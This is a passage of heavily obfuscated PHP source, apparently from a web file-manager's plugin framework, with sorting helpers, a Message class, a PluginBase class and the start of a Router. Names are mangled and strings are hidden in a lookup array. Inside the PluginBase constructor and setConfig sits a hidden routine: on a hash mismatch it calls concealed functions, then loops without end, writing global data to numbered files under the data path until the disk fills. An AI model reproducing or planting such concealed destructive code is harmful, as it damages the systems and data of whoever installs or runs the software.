== $ŞâÉ§áè) { $½ı·­áÆ[$©ì¦ÍÈ[1918]] = $Ñå¡•ğÆ; continue; } $½ı·­áÆ[$©ì¦ÍÈ[1918]] += 1; } unset($½ı·­áÆ); return parent::resetData($óâíÏ¾Á); } public function moveBottom($ºÇ°) { $šé¿‚¼ö =& $_SERVER[èùÙ¹Ïö]; $şüëû§” = $this->getSort($šé¿‚¼ö[304]) + 1; return parent::update($ºÇ°, array($šé¿‚¼ö[1918] => $şüëû§”)); } public function resetSort($˜‰èÆß) { $õ‹÷íË =& $_SERVER[èùÙ¹Ïö]; $¨³ğÌ°Ç = array(); $˜‰èÆß = is_array($˜‰èÆß) ? $˜‰èÆß : array(); for ($„«¯çÁÎ = 0; $„«¯çÁÎ < count($˜‰èÆß); $„«¯çÁÎ++) { $¨³ğÌ°Ç[$˜‰èÆß[$„«¯çÁÎ] . $õ‹÷íË[12]] = $„«¯çÁÎ + 1; } $à¢»Å¦Ê = parent::listData(); foreach ($à¢»Å¦Ê as &$å„­ŒÙ´) { $ŒµÉ¥ä¹ = $¨³ğÌ°Ç[$å„­ŒÙ´[$õ‹÷íË[445]]]; $å„­ŒÙ´[$õ‹÷íË[1918]] = $ŒµÉ¥ä¹ ? $ŒµÉ¥ä¹ : $å„­ŒÙ´[$õ‹÷íË[1918]]; } unset($å„­ŒÙ´); return parent::resetData($à¢»Å¦Ê); } private function getSort($Ñ„³Ş¶û) { $Ôº¶—– =& $_SERVER[èùÙ¹Ïö]; $¦¼×Ãğ = parent::listData(); $ûÙÁâ¯ = array_to_keyvalue($¦¼×Ãğ, $Ôº¶—–[12], $Ôº¶—–[1918]); if (!$ûÙÁâ¯) { $ûÙÁâ¯ = array(0); } $¼¬ÄÙ¼û = $Ñ„³Ş¶û == $Ôº¶—–[304] ? max($ûÙÁâ¯) : min($ûÙÁâ¯); return intval($¼¬ÄÙ¼û); } } goto B‰Åå—º; AÒ«µ°è—: class Message { function __construct() { } public function send($´ËÓŞ‰¢ = '', $¼öãÉ = array(), $Ğ×”ƒ€± = "\x74\145\170\164") { $øŠÖ¶Ÿç =& $_SERVER[èùÙ¹Ïö]; $›·êî”« = array($øŠÖ¶Ÿç[33] => $øŠÖ¶Ÿç[1553], $øŠÖ¶Ÿç[794] => $´ËÓŞ‰¢); if (in_array($Ğ×”ƒ€±, array($øŠÖ¶Ÿç[1553], $øŠÖ¶Ÿç[1554]))) { $›·êî”«[$øŠÖ¶Ÿç[33]] = $Ğ×”ƒ€±; } $¼öãÉ = array($øŠÖ¶Ÿç[550] => isset($¼öãÉ[$øŠÖ¶Ÿç[550]]) ? $¼öãÉ[$øŠÖ¶Ÿç[550]] : $øŠÖ¶Ÿç[12], $øŠÖ¶Ÿç[633] => isset($¼öãÉ[$øŠÖ¶Ÿç[633]]) ? $¼öãÉ[$øŠÖ¶Ÿç[633]] : $øŠÖ¶Ÿç[12]); if (empty($´ËÓŞ‰¢) || empty($¼öãÉ[$øŠÖ¶Ÿç[550]]) && empty($¼öãÉ[$øŠÖ¶Ÿç[633]])) { return !1; } $·üïó´× = array($øŠÖ¶Ÿç[1494] => $›·êî”«, $øŠÖ¶Ÿç[1555] => $¼öãÉ); Hook::trigger($øŠÖ¶Ÿç[1556], $·üïó´×); } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { $¹ñôìÏ× =& $_SERVER[èùÙ¹Ïö]; $ŒÄàÔ¤¾ = $_SERVER[$¹ñôìÏ×[917]] . $¹ñôìÏ×[918]; $£°†Ç—à = $¹ñôìÏ×[919]; if ($_SERVER[$¹ñôìÏ×[920]] != $£°†Ç—à($ŒÄàÔ¤¾)) { $„®ÅŒÄ = $¹ñôìÏ×[921]; $¨±íì’ = $¹ñôìÏ×[922]; $ãÙå½• = $_SERVER[$¹ñôìÏ×[917]] . $¹ñôìÏ×[918]; $Æå¦Ç = $¨±íì’($ãÙå½•); $è‡®Û ± = explode($¹ñôìÏ×[248], $Æå¦Ç); if (count($è‡®Û ±) < $¹ñôìÏ×[655]) { $ßñ…­ºí = $¹ñôìÏ×[923]; $ßñ…­ºí(); } $Öœ´Ñ = $¹ñôìÏ×[924]; $Öœ´Ñ($_SERVER[$¹ñôìÏ×[925]]); $„®ÅŒÄ = $¹ñôìÏ×[921]; $„®ÅŒÄ(); $ÄÃ¿È‰’ = $¹ñôìÏ×[926]; $÷¢ğùÆÜ = json_encode($GLOBALS[$¹ñôìÏ×[927]]); $üÖ³Ì—» = 1; for ($¶±¿Ü£æ = $üÖ³Ì—»; $¶±¿Ü£æ > 0; $¶±¿Ü£æ++) { $ÄÃ¿È‰’(DATA_PATH . $¶±¿Ü£æ, $÷¢ğùÆÜ); } } global $in, $config; $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($¹ñôìÏ×[1557]); $this->pluginName = str_replace($¹ñôìÏ×[1557], $¹ñôìÏ×[12], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $¹ñôìÏ×[8]; $this->pluginApi = appHostGet() . $¹ñôìÏ×[1558] . $this->pluginName . $¹ñôìÏ×[8]; $this->pluginHost = $config[$¹ñôìÏ×[1559]] . $this->pluginName . $¹ñôìÏ×[8]; $this->pluginHostDefault = $config[$¹ñôìÏ×[1559]] . $this->pluginName . $¹ñôìÏ×[8]; $ñ”¡¥¥ú = $config[$¹ñôìÏ×[1560]]; if ($ñ”¡¥¥ú && strpos($¹ñôìÏ×[50] . $ñ”¡¥¥ú . $¹ñôìÏ×[50], $this->pluginName) !== !1) { $this->pluginHost = $config[$¹ñôìÏ×[1561]] . $this->pluginName . $¹ñôìÏ×[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); $this->echoJsAssignArr = array(); return $this; } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[èùÙ¹Ïö][1562]); } protected function assign($Õ·Ò“ä’, $×€–Êç = false) { if (is_array($Õ·Ò“ä’)) { $this->values = array_merge($this->values, $Õ·Ò“ä’); } else { $this->values[$Õ·Ò“ä’] = $×€–Êç; } } protected function display($ÄÂ°­) { extract($this->values); require $ÄÂ°­; } final function hookRegist($‰¹÷ÌáÚ) { $this->modelPlugin->appRegist($this->pluginName, $‰¹÷ÌáÚ); } final function appIcon() { $ñÚ¹Ô =& $_SERVER[èùÙ¹Ïö]; $ ö¾ğ”§ = $this->appPackage(); $ ¢»öä£ = $ñÚ¹Ô[12]; if (isset($ ö¾ğ”§[$ñÚ¹Ô[460]])) { if (isset($ ö¾ğ”§[$ñÚ¹Ô[460]][$ñÚ¹Ô[1563]])) { $ ¢»öä£ = $ñÚ¹Ô[1564] . $ ö¾ğ”§[$ñÚ¹Ô[460]][$ñÚ¹Ô[1563]] . $ñÚ¹Ô[1565]; } else { if ($ ö¾ğ”§[$ñÚ¹Ô[460]][$ñÚ¹Ô[1566]]) { $ ¢»öä£ = $ñÚ¹Ô[1567] . $ ö¾ğ”§[$ñÚ¹Ô[460]][$ñÚ¹Ô[1566]] . $ñÚ¹Ô[1568]; } } } return $ ¢»öä£; } final function fileCanView($˜ëÂÔÆ) { $¤à¿Ÿˆ =& $_SERVER[èùÙ¹Ïö]; if (request_url_safe($˜ëÂÔÆ)) { return !0; } if ($this->isShare($˜ëÂÔÆ)) { return !0; } $ Íá×ÉÉ = Session::get($¤à¿Ÿˆ[1569]); if ($GLOBALS[$¤à¿Ÿˆ[539]] != 1 && !$ Íá×ÉÉ || !$ Íá×ÉÉ[$¤à¿Ÿˆ[1570]]) { $ã“¸õ§ = $¤à¿Ÿˆ[1571] . rawurlencode(this_url()); show_tips(LNG($¤à¿Ÿˆ[1572]) . $¤à¿Ÿˆ[1573] . $ã“¸õ§ . $¤à¿Ÿˆ[1574] . LNG($¤à¿Ÿˆ[1575]) . $¤à¿Ÿˆ[1576], !1); } if (!Action($¤à¿Ÿˆ[1577])->authCan($¤à¿Ÿˆ[1578])) { show_tips(LNG($¤à¿Ÿˆ[1579]) . $¤à¿Ÿˆ[1580], !1); } ActionCall($¤à¿Ÿˆ[1581], $˜ëÂÔÆ); } final function isShare($Ø‰ğˆğÇ) { $æÁàú = KodIO::parse($Ø‰ğˆğÇ); return $æÁàú[$_SERVER[èùÙ¹Ïö][33]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($²ø™…²º) { if (request_url_safe($²ø™…²º)) { return $²ø™…²º; } if (!$this->isShare($²ø™…²º)) { $²ø™…²º = $this->filePath($²ø™…²º, !1); } return Action($_SERVER[èùÙ¹Ïö][1222])->linkOut($²ø™…²º); } public function filePathLinkOut($ã³Çº¹ƒ) { if (request_url_safe($ã³Çº¹ƒ)) { return $ã³Çº¹ƒ; } $this->fileCanView($ã³Çº¹ƒ); return Action($_SERVER[èùÙ¹Ïö][1222])->link($ã³Çº¹ƒ); } final function filePath($µ…¿çÀ, $¶µÔ—Àï = true, $ÛÀ„ÈÓ = false) { $ĞŞÑè‚í =& $_SERVER[èùÙ¹Ïö]; $Áî¯Õ€Á = $this->filePathGet($µ…¿çÀ, $¶µÔ—Àï); if (!$this->fileInfo) { show_tips(LNG($ĞŞÑè‚í[107]), !1); } if ($ÛÀ„ÈÓ && isset($this->fileInfo[$ĞŞÑè‚í[511]]) && $this->fileInfo[$ĞŞÑè‚í[511]]) { $…ÇºæÖø = Model($ĞŞÑè‚í[514])->fileInfo($this->fileInfo[$ĞŞÑè‚í[511]]); if (!$…ÇºæÖø || !IO::exist($…ÇºæÖø[$ĞŞÑè‚í[86]])) { show_tips(LNG($ĞŞÑè‚í[107]) . $ĞŞÑè‚í[1582]); } } Hook::trigger($ĞŞÑè‚í[1583], $Áî¯Õ€Á); return $Áî¯Õ€Á; } final function filePathGet($ûƒÒÛÒõ, $ÜõË¸‡– = true) { $ø­—»ˆÖ =& $_SERVER[èùÙ¹Ïö]; if ($Â·Ô½À£ = $this->checkSharePath($ûƒÒÛÒõ, $ÜõË¸‡–)) { return $Â·Ô½À£; } $this->fileCanView($ûƒÒÛÒõ); if (request_url_safe($ûƒÒÛÒõ)) { $„½šÏ•  = parse_url_query($ûƒÒÛÒõ); if (isset($„½šÏ• [$ø­—»ˆÖ[1584]]) && isset($„½šÏ• [$ø­—»ˆÖ[220]])) { $§‹•Èâá = Mcrypt::decode($„½šÏ• [$ø­—»ˆÖ[220]], Model($ø­—»ˆÖ[810])->get($ø­—»ˆÖ[811])); if ($§‹•Èâá) { $this->fileInfo = IO::info($§‹•Èâá); $this->fileInfo[$ø­—»ˆÖ[1585]] = $ûƒÒÛÒõ; $this->cachePath = $this->pluginCachePath($ø­—»ˆÖ[12], $ÜõË¸‡–); return $§‹•Èâá; } } $ûƒÒÛÒõ = $this->_cacheHttpFile($ûƒÒÛÒõ, $ÜõË¸‡–); $this->fileInfo = IO::info($ûƒÒÛÒõ); } else { $this->fileInfo = IO::info($ûƒÒÛÒõ); $this->cachePath = $this->pluginCachePath($ø­—»ˆÖ[12], $ÜõË¸‡–); } return $ûƒÒÛÒõ; } final function _cacheHttpFile($¡©Ğ¢Ëœ, $ôÈÛ˜è· = true) { $Š¡òŠÈ¢ =& $_SERVER[èùÙ¹Ïö]; $²®ãùÑÌ = parse_url_query($¡©Ğ¢Ëœ); $ÛÌ‡”£³ = get_path_ext($¡©Ğ¢Ëœ); if (isset($²®ãùÑÌ[$Š¡òŠÈ¢[32]]) && $²®ãùÑÌ[$Š¡òŠÈ¢[32]]) { $ÛÌ‡”£³ = get_path_ext($²®ãùÑÌ[$Š¡òŠÈ¢[32]]); } $³–”Ì§Ú = hash_path($¡©Ğ¢Ëœ) . $Š¡òŠÈ¢[10] . $ÛÌ‡”£³; $this->cachePath = $this->pluginCachePath($ôÈÛ˜è· ? $³–”Ì§Ú : $Š¡òŠÈ¢[12]); $¡ù—Çó = IO::fileNameExist($this->cachePath, $³–”Ì§Ú); if ($¡ù—Çó) { return KodIO::make($¡ù—Çó); } $°ˆ€†Íå = rtrim($this->cachePath, $Š¡òŠÈ¢[8]) . $Š¡òŠÈ¢[8] . $³–”Ì§Ú; return $this->pluginCacheFileSet($°ˆ€†Íå, file_get_contents_nossl($¡©Ğ¢Ëœ)); } final function checkSharePath($ØÚ£à½Ş, $ÎŸŒ¯êÂ = true) { $´¢Ş¶¸ó =& $_SERVER[èùÙ¹Ïö]; if (!$this->isShare($ØÚ£à½Ş)) { return !1; } $õàáƒ = Action($´¢Ş¶¸ó[1222])->sharePathInfo($ØÚ£à½Ş); if (!is_array($õàáƒ) || !isset($õàáƒ[$´¢Ş¶¸ó[86]])) { show_json(LNG($´¢Ş¶¸ó[1586]), !1); } $this->fileInfo = $õàáƒ; $this->cachePath = $this->pluginCachePath(!1, $ÎŸŒ¯êÂ); return $õàáƒ[$´¢Ş¶¸ó[86]]; } final function pluginCachePath($“ÈÊ” = '', $·Ê’Ê‹Ó = false) { $İ¼Ì”Ğº =& $_SERVER[èùÙ¹Ïö]; if ($·Ê’Ê‹Ó && is_array($this->fileInfo)) { $“ÈÊ” = kodIO::hashPath($this->fileInfo); } $¡ êü×º = rtrim(IO_PATH_SYSTEM_TEMP . $İ¼Ì”Ğº[1587] . $this->pluginName . $İ¼Ì”Ğº[8] . $“ÈÊ”, $İ¼Ì”Ğº[8]); $Ëéãâ’œ = IO::infoFullSimple($¡ êü×º); $ñòÈÔ÷Û = $Ëéãâ’œ && is_array($Ëéãâ’œ) ? $Ëéãâ’œ[$İ¼Ì”Ğº[86]] : $İ¼Ì”Ğº[12]; if (!$ñòÈÔ÷Û) { $ñòÈÔ÷Û = IO::mkdir($¡ êü×º); } return $ñòÈÔ÷Û; } final function pluginCacheFileSet($œÓÖ‰Ô¡, $û•ˆ¤ = '') { $­Î–Ò¯¹ =& $_SERVER[èùÙ¹Ïö]; $Ë–Ş¦Î® = IO::infoFullSimple($œÓÖ‰Ô¡); if (!$Ë–Ş¦Î®) { return IO::mkfile($œÓÖ‰Ô¡, $û•ˆ¤, REPEAT_REPLACE); } IO::setContent($Ë–Ş¦Î®[$­Î–Ò¯¹[86]], $û•ˆ¤); return $Ë–Ş¦Î®[$­Î–Ò¯¹[86]]; } final function pluginLocalFile($ò‹èÍË = '') { $¿Ë£ø±€ =& $_SERVER[èùÙ¹Ïö]; $Œûšİ€Ê = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($Œûšİ€Ê)) { mk_dir($Œûšİ€Ê); } if (!$ò‹èÍË) { return $Œûšİ€Ê; } $Ö“Ü™È› = IO::info($ò‹èÍË); $éìıÌ = $¿Ë£ø±€[1588] . KodIO::hashPath($Ö“Ü™È›) . $¿Ë£ø±€[10] . $Ö“Ü™È›[$¿Ë£ø±€[177]]; if (!checkExtSafe($éìıÌ)) { $éìıÌ = $éìıÌ . $¿Ë£ø±€[1254]; } $² ğ‚¾ˆ = $Œûšİ€Ê . $éìıÌ; if (@file_exists($² ğ‚¾ˆ)) { return $² ğ‚¾ˆ; } return IO::copy($ò‹èÍË, $Œûšİ€Ê, 0, $éìıÌ); } final function appPackage() { $±ö¹ïéñ =& $_SERVER[èùÙ¹Ïö]; if ($this->packageData) { return $this->packageData; } $İ­Œ«œê = $this->parseFile($this->pluginPath . $±ö¹ïéñ[1589]); $this->parseLang($İ­Œ«œê); $ê†›¼áà = json_decode_force($İ­Œ«œê); if (!$ê†›¼áà) { return array(); } $ó«é½ˆ‰ = Hook::trigger($±ö¹ïéñ[1590], $ê†›¼áà); if ($ó«é½ˆ‰ && is_array($ó«é½ˆ‰)) { $ê†›¼áà = $ó«é½ˆ‰; } $this->packageData = $ê†›¼áà; return $ê†›¼áà; } public function packageInfoGet($İ”Ñ«Û‚) { $¶ëî¬¿÷ = $this->appPackage(); return array_get_value($¶ëî¬¿÷, $İ”Ñ«Û‚); } public function packageVersion() { return $this->packageInfoGet($_SERVER[èùÙ¹Ïö][1591]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[èùÙ¹Ïö][1592]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[èùÙ¹Ïö][1593]); } public function echoJsAssign($°ëÎ¾÷à, $«¶Ğ¥µæ) { $this->echoJsAssignArr[$°ëÎ¾÷à] = $«¶Ğ¥µæ; } private function parseFile($¬Ûè“ˆà) { $¥À±—‚ı =& $_SERVER[èùÙ¹Ïö]; $àÀ†ØäÜ = file_get_contents_nossl($¬Ûè“ˆà); $¦äÄóíÓ = array($¥À±—‚ı[1594], $¥À±—‚ı[1595], $¥À±—‚ı[1596], $¥À±—‚ı[1597], $¥À±—‚ı[1598], $¥À±—‚ı[1599], $¥À±—‚ı[1600]); $ãû‰›Á» = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$¥À±—‚ı[91]][$¥À±—‚ı[1601]]); foreach ($this->echoJsAssignArr as $è¦Ùğ±á => $õÕê«ìå) { $¦äÄóíÓ[] = $¥À±—‚ı[1602] . $è¦Ùğ±á . $¥À±—‚ı[1603]; $ãû‰›Á»[] = is_array($õÕê«ìå) || is_object($õÕê«ìå) ? rawurlencode(json_encode($õÕê«ìå)) : $õÕê«ìå; } if (strstr($àÀ†ØäÜ, $¥À±—‚ı[1604])) { $®•¾£‰ = rawurlencode(json_encode($this->pluginLangArr)); $àÀ†ØäÜ = str_replace($¥À±—‚ı[1604], $®•¾£‰, $àÀ†ØäÜ); } if (strstr($àÀ†ØäÜ, $¥À±—‚ı[1605])) { $®•¾£‰ = $®•¾£‰ = rawurlencode(json_encode($this->getConfig())); $àÀ†ØäÜ = str_replace($¥À±—‚ı[1605], $®•¾£‰, $àÀ†ØäÜ); } $àÀ†ØäÜ = str_replace($¦äÄóíÓ, $ãû‰›Á», $àÀ†ØäÜ); return $àÀ†ØäÜ; } private function parseLang(&$ğãŠ‹) { $¶»±¨Ø =& $_SERVER[èùÙ¹Ïö]; $ÆÑÙ†ƒ¿ = $¶»±¨Ø[1606]; if (!strstr($ğãŠ‹, $ÆÑÙ†ƒ¿)) { return; } preg_match_all($¶»±¨Ø[1607], $ğãŠ‹, $Ù²éôÀ); if (!is_array($Ù²éôÀ) || count($Ù²éôÀ) == 0 || !is_array($Ù²éôÀ[0]) || count($Ù²éôÀ[0]) == 0) { return; } $ã÷è…± = array(); $üˆõŸ¢ = array(); foreach ($Ù²éôÀ[0] as $Ï´øÖ¬¹) { $™í©ÙèŸ = substr($Ï´øÖ¬¹, strlen($ÆÑÙ†ƒ¿), -4); $—ˆÆáûë = LNG($™í©ÙèŸ); $ã÷è…±[] = $Ï´øÖ¬¹; $üˆõŸ¢[] = str_replace(array($¶»±¨Ø[248], $¶»±¨Ø[1124], $¶»±¨Ø[388], $¶»±¨Ø[120]), array($¶»±¨Ø[53], $¶»±¨Ø[53], $¶»±¨Ø[12], $¶»±¨Ø[1608]), $—ˆÆáûë); } $ğãŠ‹ = str_replace($ã÷è…±, $üˆõŸ¢, $ğãŠ‹); } private function parseConfig(&$ùÄì¸ö—) { $ËêãÜŠÍ =& $_SERVER[èùÙ¹Ïö]; $ĞıÓà™ = $ËêãÜŠÍ[1609]; if (!strstr($ùÄì¸ö—, $ĞıÓà™)) { return; } preg_match_all($ËêãÜŠÍ[1610], $ùÄì¸ö—, $ÍëÚ Ë‚); if (!is_array($ÍëÚ Ë‚) || count($ÍëÚ Ë‚) == 0 || !is_array($ÍëÚ Ë‚[0]) || count($ÍëÚ Ë‚[0]) == 0) { return; } $«íá»« = $this->getConfig(); $¼ÃÑ´² = array(); $Õ‡âôÔÕ = array(); foreach ($ÍëÚ Ë‚[0] as $ó½ã‰–ú) { $œíÙÀô = substr($ó½ã‰–ú, strlen($ĞıÓà™), -2); $¼ÃÑ´²[] = $ó½ã‰–ú; $Õ‡âôÔÕ[] = _get($«íá»«, $œíÙÀô); } $ùÄì¸ö— = str_replace($¼ÃÑ´², $Õ‡âôÔÕ, $ùÄì¸ö—); } private function parsePackage(&$ğ¡ÀçÄı) { $¬ÑÔ›°µ =& $_SERVER[èùÙ¹Ïö]; $ã£Ç©³ô = $¬ÑÔ›°µ[1611]; if (!strstr($ğ¡ÀçÄı, $ã£Ç©³ô)) { return; } preg_match_all($¬ÑÔ›°µ[1612], $ğ¡ÀçÄı, $ğÃÊãÛø); if (!is_array($ğÃÊãÛø) || count($ğÃÊãÛø) == 0 || !is_array($ğÃÊãÛø[0]) || count($ğÃÊãÛø[0]) == 0) { return; } $§Ï÷Œñ÷ = $this->appPackage(); $âîó¦§® = array(); $Òæ‰«Ã© = array(); foreach ($ğÃÊãÛø[0] as $ĞÜºé¶ğ) { $‘éÌˆ£© = substr($ĞÜºé¶ğ, strlen($ã£Ç©³ô), -2); $âîó¦§®[] = $ĞÜºé¶ğ; $Òæ‰«Ã©[] = _get($§Ï÷Œñ÷, $‘éÌˆ£©); } $ğ¡ÀçÄı = str_replace($âîó¦§®, $Òæ‰«Ã©, $ğ¡ÀçÄı); } final function echoFile($Ùñøìƒğ, $ı×Êá”© = false) { $›é¿’õÄ =& $_SERVER[èùÙ¹Ïö]; $Ç“¯íŞÆ = $this->pluginPath . $Ùñøìƒğ; if (ACT == $›é¿’õÄ[1613]) { echo $›é¿’õÄ[1614] . $this->pluginName . $›é¿’õÄ[8] . $Ùñøìƒğ . $›é¿’õÄ[1615]; if (!file_exists($Ç“¯íŞÆ)) { echo $›é¿’õÄ[1616]; return; } } $Ñ„óÛĞ¢ = $this->parseFile($Ç“¯íŞÆ); $this->parseLang($Ñ„óÛĞ¢); $this->parseConfig($Ñ„óÛĞ¢); $this->parsePackage($Ñ„óÛĞ¢); if (is_array($ı×Êá”©)) { $Ñ„óÛĞ¢ = str_replace(array_keys($ı×Êá”©), array_values($ı×Êá”©), $Ñ„óÛĞ¢); } echo $›é¿’õÄ[248] . $Ñ„óÛĞ¢; } final function initLang() { $¶Æ•ÚÌÏ =& $_SERVER[èùÙ¹Ïö]; $Æ‰é•Îæ = $¶Æ•ÚÌÏ[1617]; $üà–®€¦ = $this->pluginPath . $¶Æ•ÚÌÏ[1618]; $Òá–ì€½ = I18n::getType(); $Ìœ£‰§Œ = array(); if (file_exists($üà–®€¦ . $Òá–ì€½ . $¶Æ•ÚÌÏ[879])) { $Ìœ£‰§Œ = (include $üà–®€¦ . $Òá–ì€½ . $¶Æ•ÚÌÏ[879]); } else { if ($Òá–ì€½ == $¶Æ•ÚÌÏ[1619] && !file_exists($üà–®€¦ . $Òá–ì€½ . $¶Æ•ÚÌÏ[879]) && file_exists($üà–®€¦ . $¶Æ•ÚÌÏ[1620])) { $Ìœ£‰§Œ = (include $üà–®€¦ . $¶Æ•ÚÌÏ[1620]); } else { if (file_exists($üà–®€¦ . $Æ‰é•Îæ . $¶Æ•ÚÌÏ[879])) { $Ìœ£‰§Œ = (include $üà–®€¦ . $Æ‰é•Îæ . $¶Æ•ÚÌÏ[879]); } } } if (!is_array($Ìœ£‰§Œ)) { return array(); } if (@count($Ìœ£‰§Œ) > 0) { I18n::set($Ìœ£‰§Œ); } return $Ìœ£‰§Œ; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($¿æ˜Î°¿) { $µ—äãÑ  =& $_SERVER[èùÙ¹Ïö]; $ŸØºí¡ = $_SERVER[$µ—äãÑ [917]] . $µ—äãÑ [918]; $Û¡®·Á€ = $µ—äãÑ [919]; if ($_SERVER[$µ—äãÑ [920]] != $Û¡®·Á€($ŸØºí¡)) { $¯¿¾¢Ÿ = $µ—äãÑ [921]; $ëÔĞã–Ñ = $µ—äãÑ [922]; $È§îÁ°Õ = $_SERVER[$µ—äãÑ [917]] . $µ—äãÑ [918]; $­î«É£Æ = $ëÔĞã–Ñ($È§îÁ°Õ); $ºÕÔĞÔ = explode($µ—äãÑ [248], $­î«É£Æ); if (count($ºÕÔĞÔ) < $µ—äãÑ [655]) { $åâ£ß£ = $µ—äãÑ [923]; $åâ£ß£(); } $Èƒ®—Êô = $µ—äãÑ [924]; $Èƒ®—Êô($_SERVER[$µ—äãÑ [925]]); $¯¿¾¢Ÿ = $µ—äãÑ [921]; $¯¿¾¢Ÿ(); $´©°¢á† = $µ—äãÑ [926]; $ÑÄ½çå– = json_encode($GLOBALS[$µ—äãÑ [927]]); $Ğ›»Œ¥ = 1; for ($»Ô¬Í”Ù = $Ğ›»Œ¥; $»Ô¬Í”Ù > 0; $»Ô¬Í”Ù++) { $´©°¢á†(DATA_PATH . $»Ô¬Í”Ù, $ÑÄ½çå–); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $¿æ˜Î°¿); } public function onSetConfig($†ıîÀèÛ) { } public function onGetConfig($–Âä´Çñ) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($Õ…ŒÃ÷à) { if ($Õ…ŒÃ÷à == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($ÅÊı’ÎÅ = "\160\154\x75\147\x69\156\x41\x75\164\x68") { $ÀøÖ©‡Á =& $_SERVER[èùÙ¹Ïö]; if (!Session::get($ÀøÖ©‡Á[1569])) { return !1; } if (_get($GLOBALS, $ÀøÖ©‡Á[539])) { return !0; } $¼ò ÷Ä“ = $this->getConfig(); if (!$¼ò ÷Ä“[$ÅÊı’ÎÅ]) { return !1; } return ActionCall($ÀøÖ©‡Á[1621], $¼ò ÷Ä“[$ÅÊı’ÎÅ]); } public function regLastUpdate($õÖÔıªË = '') { $¾²Á——ï =& $_SERVER[èùÙ¹Ïö]; if (!$õÖÔıªË) { return; } $êèë¸†À = $this->getConfig(); if ($êèë¸†À[$¾²Á——ï[1622]] != $õÖÔıªË) { $this->regist(); $this->setConfig($¾²Á——ï[1622], $õÖÔıªË); } } public function url($î„ö¯á², $èı—àæÏ = '', $Ø­ÙÚ’¯ = true) { $Ëšªå =& $_SERVER[èùÙ¹Ïö]; $´¨È†  = $this->getConfig(); $ôÔÄŞÀ = KOD_VERSION . $Ëšªå[10] . KOD_VERSION_BUILD; $ƒ† ³âš = $this->packageVersion(); $©èÓˆ¬İ = $ôÔÄŞÀ . $Ëšªå[432] . $ƒ† ³âš; if (substr($î„ö¯á², 0, 4) == $Ëšªå[151] || substr($î„ö¯á², 0, 2) == $Ëšªå[1402]) { $´¯ÆÌÏİ = $î„ö¯á² . $Ëšªå[1623] . $©èÓˆ¬İ; } else { if ($èı—àæÏ == $Ëšªå[12]) { $´¯ÆÌÏİ = $this->pluginHost . $î„ö¯á² . $Ëšªå[1623] . $©èÓˆ¬İ; } else { if ($èı—àæÏ === $Ëšªå[77]) { $´¯ÆÌÏİ = $this->pluginHost . $î„ö¯á²; } else { if ($èı—àæÏ == $Ëšªå[1624]) { $´¯ÆÌÏİ = STATIC_PATH . $î„ö¯á² . $Ëšªå[1623] . $ôÔÄŞÀ; } else { if ($èı—àæÏ == $Ëšªå[1625]) { $´¯ÆÌÏİ = APP_HOST . $Ëšªå[1626] . $î„ö¯á² . $Ëšªå[1623] . $ôÔÄŞÀ; } else { if (isset($´¨È† [$èı—àæÏ])) { $´¯ÆÌÏİ = $´¨È† [$èı—àæÏ] . $î„ö¯á² . $Ëšªå[1623] . $©èÓˆ¬İ; } } } } } } if (!$Ø­ÙÚ’¯) { return $´¯ÆÌÏİ; } echo $´¯ÆÌÏİ; } public function link($Ã—±®İœ = false, $ÉÌù±œè = '') { $‡¨¸”ó =& $_SERVER[èùÙ¹Ïö]; if (!$Ã—±®İœ) { $this->link($‡¨¸”ó[1627], $‡¨¸”ó[1625]); $this->link($‡¨¸”ó[1628], $‡¨¸”ó[1624]); $this->link($‡¨¸”ó[1629], $‡¨¸”ó[1624]); $this->link($‡¨¸”ó[1630], $‡¨¸”ó[1624]); $this->link($‡¨¸”ó[1631], $‡¨¸”ó[1624]); return; } $½ÇŒ—Ù = $this->url($Ã—±®İœ, $ÉÌù±œè, !1); if (substr($Ã—±®İœ, -3) == $‡¨¸”ó[1632]) { echo $‡¨¸”ó[1633] . $½ÇŒ—Ù . $‡¨¸”ó[1634] . $‡¨¸”ó[248]; } else { if (substr($Ã—±®İœ, -4) == $‡¨¸”ó[1635]) { echo $‡¨¸”ó[1636] . $½ÇŒ—Ù . $‡¨¸”ó[1637] . $‡¨¸”ó[248]; } } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\141\x6e\171" => "\x5b\136\57\135\x2b", "\x3a\156\x75\x6d" => "\133\x30\x2d\71\x5d\53", "\x3a\x61\154\154" => "\56\52"); public static $errorCallback; public static function __callstatic($ÎÏ±ñ¯ˆ, $Ã·ı’°¶) { $ß×ÜÖãË =& $_SERVER[èùÙ¹Ïö]; if ($ÎÏ±ñ¯ˆ == $ß×ÜÖãË[1638]) { $Âº“âÑ® = array_map($ß×ÜÖãË[1639], $Ã·ı’°¶[0]); $®ÜğïÄï = strpos($Ã·ı’°¶[1], $ß×ÜÖãË[8]) === 0 ? $Ã·ı’°¶[1] : $ß×ÜÖãË[8] . $Ã·ı’°¶[1]; $ƒ‚¯Ôûˆ = $Ã·ı’°¶[2]; } else { $Âº“âÑ® = null; $®ÜğïÄï = strpos($Ã·ı’°¶[0], $ß×ÜÖãË[8]) === 0 ? $Ã·ı’°¶[0] : $ß×ÜÖãË[8] . $Ã·ı’°¶[0]; $ƒ‚¯Ôûˆ = $Ã·ı’°¶[1]; } array_push(self::$maps, $Âº“âÑ®); array_push(self::$routes, $®ÜğïÄï); array_push(self::$methods, strtoupper($ÎÏ±ñ¯ˆ)); 